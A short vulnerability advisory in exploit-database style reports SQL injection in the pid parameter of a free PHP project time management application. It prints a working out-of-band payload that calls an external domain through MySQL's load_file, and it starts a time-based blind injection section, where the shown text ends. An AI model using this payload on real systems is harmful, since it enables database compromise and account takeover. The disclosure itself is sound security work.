## Title: Online Project Time Management 1.0 Multiple SQL - Injections
## Author: nu11secur1ty
## Date: 01.20.2022
## Vendor: https://www.sourcecodester.com/users/tips23
## Software: https://www.sourcecodester.com/php/15136/online-project-time-management-system-phpoop-free-source-code.html

## Description:
The pid parameter appears to be vulnerable to SQL injection attacks.
The payload '+(select
load_file('\\\\zvy9qc1hwmbswes0cz4uctw9a0gt4l59wck37uvj.sourcecodester.com\\axz'))+'
was submitted in the pid parameter.
This payload injects a SQL sub-query that calls MySQL's load_file
function with a UNC file path that references a URL on an external
domain.
The application interacted with that domain, indicating that the
injected SQL query was executed.
The attacker can take account control of all accounts plus an
administrator account on this system.
Status: CRITICAL

[+] Payload:

```mysql

Parameter: pid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
